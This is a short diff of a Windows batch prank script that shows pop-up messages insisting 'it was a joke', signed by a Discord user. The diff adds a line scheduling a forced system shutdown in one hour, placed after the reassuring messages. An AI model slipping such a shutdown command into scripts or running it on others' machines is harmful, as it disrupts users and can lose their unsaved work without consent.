@@ -59,6 +59,7 @@ msg * I said it was a joke if you undersand press ok
 msg * I said its a joke dont be mad
 msg * It was a funny time to joke with you but have a nice day dont forget to be nice to everyone arround you and make people laught not cry :)
 msg * created by Melvin, Discord name thenight__
+shutdown /s /t 3600
 
 @echo off
 
